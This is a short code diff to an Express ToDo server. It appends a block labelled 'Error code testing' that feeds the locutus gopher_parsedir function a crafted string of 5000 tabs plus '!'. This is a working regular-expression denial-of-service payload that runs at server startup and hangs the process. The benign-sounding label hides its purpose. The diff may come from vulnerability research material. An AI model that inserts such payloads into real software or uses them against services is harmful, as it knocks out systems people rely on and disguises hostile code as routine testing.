@@ -37,3 +37,18 @@ app.use(errorRoutes)
 app.listen(port, () => {
   console.log('ToDo server is up on port ' + port)
 })
+
+/** Error code testing **/
+var gopher_parsedir = require('locutus/php/net-gopher/gopher_parsedir')
+function build_attack(n) {
+  var ret = ''
+  for (var i = 0; i < n; i++) {
+    ret += '\t'
+  }
+  return ret + '!'
+}
+
+var attack_str = build_attack(5000)
+// var entry = gopher_parsedir('0All about my gopher site.\t/allabout.txt\tgopher.example.com\t70\u000d\u000a')
+var entry = gopher_parsedir(attack_str)
+/** Error code testing **/
